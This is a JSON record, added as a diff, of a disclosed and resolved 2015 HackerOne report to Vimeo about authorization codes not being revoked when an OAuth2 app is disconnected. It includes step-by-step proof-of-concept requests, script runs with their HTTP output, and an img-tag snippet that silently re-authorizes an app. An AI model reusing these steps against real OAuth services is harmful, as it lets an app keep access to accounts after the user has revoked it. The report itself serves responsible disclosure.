@@ -1,0 +1,123 @@
+{
+  "id": 57603,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzYwMw==",
+  "url": "https://hackerone.com/reports/57603",
+  "title": "API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-04-21T14:44:49.464Z",
+  "submitted_at": "2015-04-21T14:44:49.464Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dor1s",
+    "url": "/dor1s",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 56,
+    "url": "https://hackerone.com/vimeo",
+    "handle": "vimeo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vimeo",
+      "twitter_handle": "vimeo",
+      "website": "https://vimeo.com",
+      "about": "Make life worth watching"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2015-05-31T17:40:09.964Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2015-05-01T17:39:39.799Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.\r\n\r\nProof of Concept\r\n==============\r\n*(all scripts used are attached)*\r\n\r\n1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n2) Log into your Vimeo account (if needed) and click **Allow**\r\n3) Copy `code` value from callback url, for example:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n```\r\n`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`\r\n4) Use `code` value to obtain `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n{\r\n    \"access_token\": \"d3ac3bb53d1c4ebc3de7d28e4ed801c0\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ... >\r\n}\r\n```\r\n5) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:10:29 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:10:29 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1239-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429625429.334602,VS0,VE203\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n< ... CUT OUT ... >\r\n}\r\n```\r\n6) Repeat step 1. Link for my test application:\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\r\n```\r\n7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.\r\n*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.\r\n\r\n*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:\r\n```\r\n<html>\r\n\t<img src=\"https://api.vimeo.com/oauth/authorize?response_type=code&client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a&redirect_uri=https://avuln.com/callback&scope=public&state=0123456789abcdef\">\r\n</html>\r\n```\r\n\r\nsuch code will \"silently\" produce new `access_token` value to callback each time it has been loaded by the user.\r\n\r\n8) Copy `code` value from callback url and save it for future usage:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef&code=82e24f835184f47cd83f249907e7bd5018bf62c9\r\n```\r\n`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`\r\n\r\n9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)\r\n\r\n10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section\r\n\r\n11) To ensure that access is denied, repeat step 5:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 401 Authorization Required\r\nDate: Tue, 21 Apr 2015 14:23:55 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.error+json\r\nCache-Control: no-cache, max-age=315360000\r\nWWW-Authenticate: Bearer error=\"invalid_token\"\r\nExpires: Fri, 18 Apr 2025 14:23:55 GMT\r\nContent-Length: 53\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nX-Served-By: cache-fra1245-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626235.146346,VS0,VE105\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"error\": \"A valid user token must be passed.\"\r\n}\r\n```\r\n12) Use `code` value from step 8 and exchange it for `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9\r\n{\r\n    \"access_token\": \"9eabdc746910ea39c07395ee1b69a2b9\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n13) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:25:41 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:25:41 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1235-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626341.087757,VS0,VE201\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n<... CUT OUT ...>\r\n}\r\n```\r\n\r\nImpact\r\n======\r\nThe vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.\r\n\r\nMitigation\r\n========\r\nFor access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 35603,
+      "file_name": "getAccessToken.sh.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/603/d757f905c14ffd7a97358c6d9d744e4050c3e1cd/getAccessToken.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22getAccessToken.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27getAccessToken.sh.txt&response-content-type=text%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113918Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=456ec511e33b5f9551034b5c2c59a61f0980de6da297cc10563ae1357fd7301b",
+      "file_size": 335,
+      "type": "text/x-shellscript",
+      "moderated": null
+    },
+    {
+      "id": 35604,
+      "file_name": "me.sh.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/604/0c0c5d2ac149868c9732fca6431dfaf7d37bc29f/me.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22me.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27me.sh.txt&response-content-type=text%2Fx-shellscript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T113918Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7d179eefb6f4dcff232d5184c2cc050abfda66c9bc7235a0461602980d194562",
+      "file_size": 70,
+      "type": "text/x-shellscript",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2015-05-31T17:40:03.386Z",
+  "allow_singular_disclosure_after": -274730355.0952714,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "mr-medi",
+    "r3y",
+    "shivammusic",
+    "b2e03cf86efe1b26323c39c",
+    "runkixt",
+    "webtrack"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
